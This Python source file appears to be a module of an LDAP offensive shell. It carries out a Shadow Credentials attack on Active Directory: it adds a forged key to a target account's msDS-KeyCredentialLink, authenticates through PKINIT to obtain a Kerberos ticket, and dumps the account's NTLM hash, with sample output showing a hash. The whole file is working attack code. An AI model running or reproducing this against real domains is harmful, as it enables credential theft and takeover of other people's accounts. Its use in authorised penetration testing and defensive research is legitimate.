import logging
import random
import OpenSSL
from ldap3 import Connection, MODIFY_REPLACE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap_shell.utils.ldap_utils import LdapUtils
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid
from minikerberos.common.ccache import CCACHE
from minikerberos.common.target import KerberosTarget
from minikerberos.network.clientsocket import KerberosClientSocket
from ldap_shell.utils.myPKINIT import myPKINIT

class LdapShellModule(BaseLdapModule):
    """Module for getting NTLM hash using Shadow Credentials attack"""
    
    help_text = "Get NTLM hash using Shadow Credentials attack (requires write access to msDS-KeyCredentialLink)"
    examples_text = """
    Get NTLM hash for user john:
    `get_ntlm john`
    ```
    [INFO] Target user found: john
    [INFO] KeyCredential generated with DeviceID: 26d8713b-4a44-4792-82b7-2e30f5e33ab5
    [INFO] Successfully added new key
    [INFO] Got TGT using certificate
    [INFO] NTLM hash for john: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
    [INFO] Cleaning up DeviceID...
    [INFO] Cleanup successful
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target user (sAMAccountName)",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER]
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        # Проверка TLS
        if not self.client.tls_started and not self.client.server.ssl:
            self.log.info('Sending StartTLS command...')
            if not self.client.start_tls():
                self.log.error("StartTLS failed")
                return self.log.error('Error: LDAPS required. Try -use-ldaps flag')
            else:
                self.log.info('StartTLS succeeded!')

        # Поиск целевого пользователя
        target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error(f'Target user not found: {self.args.target}')
            return

        self.log.info(f"Target user found: {self.args.target}")

        # Генерация сертификата и KeyCredential
        try:
            certificate = X509Certificate2(
                subject=self.args.target,
                keySize=2048,
                notBefore=(-40 * 365),
                notAfter=(40 * 365)
            )

            device_id = Guid()
            key_credential = KeyCredential.fromX509Certificate2(
                certificate=certificate,
                deviceId=device_id,
                owner=self.domain_dumper.root,
                currentTime=DateTime()
            )

            self.log.info(f"KeyCredential generated with DeviceID: {key_credential.DeviceId.toFormatD()}")

            # Получение текущих значений и добавление нового ключа
            results = self.client.search(
                target_dn,
                '(objectClass=*)',
                attributes=['msDS-KeyCredentialLink']
            )
            if not results:
                self.log.error('Could not query target user properties')
                return

            current_values = self.client.response[0]['raw_attributes'].get('msDS-KeyCredentialLink', [])
            new_values = current_values + [key_credential.toDNWithBinary().toString()]

            self.client.modify(
                target_dn,
                {'msDS-KeyCredentialLink': [(MODIFY_REPLACE, new_values)]}
            )

            if self.client.result['result'] != 0:
                self.log.error(f"Failed to add key: {self.client.result['message']}")
                return

            self.log.info("Successfully added new key")

            try:
                # PKINIT аутентификация
                pfx_pass = ''.join(chr(random.randint(1,255)) for _ in range(20)).encode()
                pk = OpenSSL.crypto.PKCS12()
                pk.set_privatekey(certificate.key)
                pk.set_certificate(certificate.certificate)
                pfxdata = pk.export(passphrase=pfx_pass)

                dhparams = {
                    'p': int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
                    'g': 2
                }

                domain = self.client.user.split('\\')[0]
                ini = myPKINIT.from_pfx_data(pfxdata, pfx_pass, dhparams)
                req = ini.build_asreq(domain, self.args.target)
                sock = KerberosClientSocket(KerberosTarget(self.client.server.host))

                res = sock.sendrecv(req)
                if hasattr(res, 'native') and res.native.get('error-code') == 15:
                    self.log.error("PKINIT authentication is not supported by the domain controller.")
                    self.log.error("This attack requires PKINIT support to be enabled on the domain.")
                    raise Exception("PKINIT not supported")

                self.log.info("Got TGT using certificate")
                encasrep, session_key, cipher = ini.decrypt_asrep(res.native)
                ccache = CCACHE()
                ccache.add_tgt(res.native, encasrep)
                ccache_data = ccache.to_bytes()

                dumper = myPKINIT.GETPAC(
                    self.args.target,
                    domain,
                    self.client.server.host,
                    session_key
                )
                dumper.dump(domain, self.client.server.host, ccache_data)

            except Exception as e:
                self.log.error(f"Error during PKINIT authentication: {str(e)}")
                self.log.error("This could be because PKINIT is not supported or disabled in the domain")
            
            finally:
                # Очистка в любом случае
                self.log.info("Cleaning up DeviceID...")
                new_values = []
                for dn_binary_value in current_values:
                    key_cred = KeyCredential.fromDNWithBinary(
                        DNWithBinary.fromRawDNWithBinary(dn_binary_value)
                    )
                    if device_id.toFormatD() != key_cred.DeviceId.toFormatD():
                        new_values.append(dn_binary_value)

                self.client.modify(
                    target_dn,
                    {'msDS-KeyCredentialLink': [(MODIFY_REPLACE, new_values)]}
                )

                if self.client.result['result'] == 0:
                    self.log.info("Cleanup successful")
                else:
                    self.log.error(f"Cleanup failed: {self.client.result['message']}")

        except Exception as e:
            self.log.error(f'Error: {str(e)}')
            return
